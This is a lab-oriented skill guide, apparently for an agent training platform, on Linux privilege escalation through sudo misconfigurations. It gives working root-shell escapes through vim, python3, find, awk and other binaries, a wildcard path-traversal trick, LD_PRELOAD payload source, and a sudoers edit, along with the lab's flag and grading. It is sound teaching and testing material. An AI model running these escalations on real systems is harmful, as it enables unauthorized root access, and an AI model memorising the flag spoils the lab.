---
name: analyzing-sudo-rules-for-privesc-vectors
description: >-
  Enumerate and exploit sudo misconfigurations on Linux systems to escalate
  privileges. Covers NOPASSWD entries, wildcard abuse, sudo -l enumeration,
  LD_PRELOAD injection, and GTFOBins lookup for allowed commands in isolated
  lab environments. Core skill for Linux privilege escalation phases.
domain: cybersecurity
subdomain: privilege-escalation
tags: [sudo, privilege-escalation, linux, privesc, intermediate, gtfobins, nopasswd]
difficulty: intermediate
mitre_techniques: [T1548.003]
nist_csf_functions: [Identify, Protect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/privilege-escalation/sudo-lab
---

> ⚠️ **Educational Use Only** — Sudo exploitation techniques must only be practiced in isolated lab environments or during authorized penetration testing engagements with written permission. Unauthorized privilege escalation on any system is a criminal offense.

## When to Use

- After gaining initial foothold on a Linux target during an authorized pentest, during privilege escalation enumeration
- In CTF challenges requiring root access via sudo misconfigurations
- When auditing Linux sudoers files for overly permissive rules
- As a companion to the SUID misconfigurations skill — both cover Linux privilege escalation vectors
- When learning about the principle of least privilege and how to correctly configure sudo policies

## Prerequisites

- **Knowledge:** Basic Linux command line, understanding of root vs non-root users
- **Lab:** `labs/privilege-escalation/sudo-lab` — start with `agentlab start sudo-lab`
- **Difficulty:** Intermediate
- **Time:** 30–45 minutes

## Workflow

### Step 1: Start the Lab

```bash
agentlab start sudo-lab
agentlab exec sudo-lab bash
# Starting as: developer (low-privilege user)
id
# uid=1001(developer) gid=1001(developer)
```

### Step 2: Enumerate Sudo Permissions

The first thing to always check after gaining a shell:

```bash
sudo -l
# Example output:
# User developer may run the following commands on target:
#     (ALL) NOPASSWD: /usr/bin/vim
#     (ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/*.py
#     (root) NOPASSWD: /usr/bin/find /var/log -name *.log
```

### Step 3: GTFOBins Lookup for Allowed Commands

For every command listed in `sudo -l`, check GTFOBins for exploitation:

**Pattern: `sudo vim`**
```bash
sudo vim -c ':!/bin/bash'
# Opens bash as root
```

**Pattern: `sudo python3`**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Pattern: `sudo find`**
```bash
sudo find /var/log -name "*.log" -exec /bin/bash \;
```

**Pattern: `sudo less`**
```bash
sudo less /etc/passwd
# Inside less: !bash
```

**Pattern: `sudo awk`**
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**Pattern: `sudo nano`**
```bash
sudo nano
# ^R ^X then: reset; bash 1>&0 2>&0
```

### Step 4: Wildcard Abuse in Sudo Rules

If sudo allows: `(ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/*.py`

```bash
# Create a malicious .py file that the wildcard matches
echo 'import os; os.system("/bin/bash")' > /tmp/evil.py
# Try to use path traversal in the wildcard
sudo python3 /opt/scripts/../../../tmp/evil.py
```

### Step 5: LD_PRELOAD Injection

If `env_keep+=LD_PRELOAD` is visible in `sudo -l` output:

```bash
# Create a malicious shared library
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find /var/log -name "*.log"
# → root shell
```

### Step 6: Editing sudoers Directly (if sudo vi/visudo is allowed)

```bash
# If sudo vim is available
sudo vim /etc/sudoers
# Add: developer ALL=(ALL) NOPASSWD:ALL
# :wq to save
sudo bash
# → root shell
```

### Step 7: Capture the Flag

```bash
# After escalating to root
cat /root/flag.txt
# FLAG{sudo_misconfiguration_exploited}
```

```bash
agentlab verify sudo-lab "FLAG{sudo_misconfiguration_exploited}"
```

## Key Concepts

| Concept | Definition |
|---------|-----------|
| sudoers | Configuration file (`/etc/sudoers`) defining what commands users may run with elevated privileges |
| NOPASSWD | Sudoers directive allowing a command to run without password — extremely dangerous if misconfigured |
| LD_PRELOAD | Environment variable that injects a shared library before all others — can override libc functions |
| Wildcard Abuse | Exploiting `*` in sudo rules to match unintended paths |
| T1548.003 | MITRE ATT&CK: Abuse Elevation Control Mechanism — Sudo and Sudo Caching |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| `sudo -l` | List allowed sudo commands for current user | ✅ Built-in |
| GTFOBins | Exploitation techniques for allowed sudo binaries | ✅ Referenced in hints |
| LinPEAS | Automated sudo misconfiguration enumeration | ✅ Pre-installed |
| `gcc` | Compile LD_PRELOAD payloads | ✅ Pre-installed |

## Output / Verification

```bash
agentlab verify sudo-lab "FLAG{sudo_misconfiguration_exploited}"
```

**Score:** 150 points for root flag + 50 bonus for each unique exploitation technique demonstrated

## Further Reading

- [GTFOBins — sudo section](https://gtfobins.github.io/)
- MITRE ATT&CK: [T1548.003 — Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)
- [PayloadsAllTheThings — Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#sudo)
- [HackTricks: Sudo](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)
